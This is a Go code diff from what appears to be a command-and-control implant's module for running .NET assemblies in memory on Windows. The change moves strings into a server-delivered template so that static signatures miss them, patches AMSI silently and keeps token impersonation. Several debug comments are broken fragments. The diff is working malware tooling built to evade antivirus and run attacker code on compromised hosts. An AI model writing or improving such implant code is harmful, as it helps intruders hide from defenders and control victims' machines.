@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -75,14 +76,74 @@ var (
 	iaFnClose                 = string([]byte{0x5f, 0x63, 0x6c, 0x6f, 0x73, 0x65})                                                                                     // _close
 )
 
-// CLR strings (constructed to avoid static signatures)
-var (
-	iaClrV4        = string([]byte{0x76, 0x34})                                                 // v4
-	iaClrV2        = string([]byte{0x76, 0x32})                                                 // v2
-	iaClrV2Full    = string([]byte{0x76, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37}) // v2.0.50727
-	iaTempPrefix   = string([]byte{0x63, 0x6c, 0x72, 0x5f, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x5f}) // clr_output_
-	iaTempSuffix   = string([]byte{0x2e, 0x74, 0x78, 0x74})                                     // .txt
+// InlineAssemblyTemplate indices (must match server's common.go)
+const (
+	// CLR strings
+	idxIAClrV4      = 400
+	idxIAClrV2      = 401
+	idxIAClrV2Full  = 402
+	idxIATempPrefix = 403
+	idxIATempSuffix = 404
 )
+
+// Shared template storage for inline assembly
+var (
+	iaTemplate   []string
+	iaTemplateMu sync.RWMutex
+)
+
+// SetInlineAssemblyTemplate sets the shared inline assembly template (called from command processing)
+func SetInlineAssemblyTemplate(templates []string) {
+	iaTemplateMu.Lock()
+	iaTemplate = templates
+	iaTemplateMu.Unlock()
+}
+
+// iaTpl safely retrieves a template string by index
+func iaTpl(idx int) string {
+	iaTemplateMu.RLock()
+	defer iaTemplateMu.RUnlock()
+	if iaTemplate != nil && idx < len(iaTemplate) {
+		return iaTemplate[idx]
+	}
+	return ""
+}
+
+// Convenience functions for CLR strings with fallbacks
+func iaClrV4() string {
+	if s := iaTpl(idxIAClrV4); s != "" {
+		return s
+	}
+	return "v4"
+}
+
+func iaClrV2() string {
+	if s := iaTpl(idxIAClrV2); s != "" {
+		return s
+	}
+	return "v2"
+}
+
+func iaClrV2Full() string {
+	if s := iaTpl(idxIAClrV2Full); s != "" {
+		return s
+	}
+	return "v2.0.50727"
+}
+
+func iaTempPrefix() string {
+	if s := iaTpl(idxIATempPrefix); s != "" {
+		return s
+	}
+	return "clr_output_"
+}
+
+func iaTempSuffix() string {
+	if s := iaTpl(idxIATempSuffix); s != "" {
+		return s
+	}
+	return ".txt"
+}
 
 // Windows API declarations (initialized in init to use hex strings)
 var (
@@ -210,7 +271,7 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 
 	// Create temp file for output
 	tempDir := os.TempDir()
-	outputFile := filepath.Join(tempDir, iaTempPrefix+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix)
+	outputFile := filepath.Join(tempDir, iaTempPrefix()+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix())
 
 	// Create file handle
 	outputPath, _ := syscall.UTF16PtrFromString(outputFile)
@@ -251,9 +312,9 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	// Execute assembly
@@ -292,9 +353,9 @@ func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, in
 		defer coUninitialize.Call()
 	}
 
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
@@ -315,35 +376,17 @@ func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, con
 }, executionNumber int) (string, int) {
 	var output strings.Builder
 
-	// Log current token context if active
-	if globalTokenStore != nil {
-		globalTokenStore.mu.RLock()
-		if globalTokenStore.NetOnlyHandle != 0 {
-			output.WriteString(SuccCtx(S20, globalTokenStore.NetOnlyToken) + "\n")
-		} else if globalTokenStore.IsImpersonating {
-			output.WriteString(SuccCtx(S21, globalTokenStore.ActiveToken) + "\n")
-			output.WriteString(Succ(S24) + "\n")
-		} else {
-			output.WriteString(Succ(S22) + "\n")
-		}
-		globalTokenStore.mu.RUnlock()
-	}
-
-	// Apply bypasses if needed
+	// Apply bypasses silently - removed verbose output
 	if config.BypassAMSI {
-		if err := patchAMSI(); err == nil {
-			output.WriteString(Succ(S23) + "\n")
-		}
+		patchAMSI()
 	}
-
-	output.WriteString(Succ(S25) + "\n")
 
 	// Try synchronous capture first
-	// removed debug log
+	// &] Attempting synchronous capture")
 	assemblyOutput, exitCode, err := executeWithSyncCapture(assemblyBytes, config.Arguments)
 
 	if assemblyOutput == "" {
-		// removed debug log
+		// &] No output from sync capture, trying test capture")
 		assemblyOutput, exitCode, err = executeWithTestCapture(assemblyBytes, config.Arguments)
 	}
 
@@ -361,14 +404,14 @@ func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, con
 		output.WriteString("\n" + Err(E46) + "\n")
 	}
 
-	output.WriteString(fmt.Sprintf("\n%s:%d\n", Succ(S5), exitCode))
+	// Removed verbose output
 
 	return output.String(), exitCode
 }
 
 // Simple synchronous version to avoid goroutine issues
 func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-	// removed debug log
+	// &] executeWithSyncCapture: Starting")
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -377,33 +420,33 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	defer tokenCleanup()
 
 	// NOW initialize COM under the impersonated context
-	// removed debug log
+	// &] Initializing COM")
 	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
 	if hr == 0 {
 		defer coUninitialize.Call()
-		// removed debug log
+		// &] COM initialized")
 	}
 
 	// Create pipe with buffer
 	var readPipe, writePipe syscall.Handle
-	// removed debug log
+	// &] Creating pipe")
 	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
 	if err != nil {
 		// Detect runtime version
-		targetRuntime := iaClrV4
-		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-			targetRuntime = iaClrV2
+		targetRuntime := iaClrV4()
+		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+			targetRuntime = iaClrV2()
 		}
 		retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 		return "", int(retCode), err
 	}
 	defer syscall.CloseHandle(readPipe)
-	// removed debug log
+	// &] Pipe created successfully")
 
 	// Check/create console
 	consoleCreated := false
 	if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
-		// removed debug log
+		// &] Creating console")
 		allocConsole.Call()
 		consoleCreated = true
 		if newWnd, _, _ := getConsoleWindow.Call(); newWnd != 0 {
@@ -412,40 +455,40 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Save original handles
-	// removed debug log
+	// &] Saving original handles")
 	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
 	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)
 
 	// Redirect handles
-	// removed debug log
+	// &] Redirecting handles")
 	setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
 	setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))
 
 	// Critical: Redirect CRT file descriptors
-	// removed debug log
+	// &] Redirecting CRT file descriptors")
 	fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
 	if fd != INVALID_HANDLE_VALUE {
 		dup2.Call(fd, 1)
 		dup2.Call(fd, 2)
-		// removed debug log
+		// &] CRT descriptors redirected")
 	}
 
 	// Detect runtime version
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
-	// removed debug log
+	// &] Executing assembly")
 	// Execute the assembly
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 
 	// Close write pipe to signal EOF
-	// removed debug log
+	// &] Closing write pipe")
 	syscall.CloseHandle(writePipe)
 
 	// Now read all data from the pipe
-	// removed debug log
+	// &] Reading from pipe")
 	var output bytes.Buffer
 	buffer := make([]byte, 4096)
 
@@ -485,7 +528,7 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Restore handles
-	// removed debug log
+	// &] Restoring handles")
 	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
 	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
 
@@ -502,7 +545,7 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 
 // Even simpler - just test if we can capture anything
 func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-	// removed debug log
+	// & TEST] Starting test capture")
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -517,13 +560,13 @@ func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime version
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	// Test 1: Can we execute at all?
-	// removed debug log
+	// & TEST] Test 1: Direct execution")
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 
 	// The output we saw earlier suggests the assembly IS running
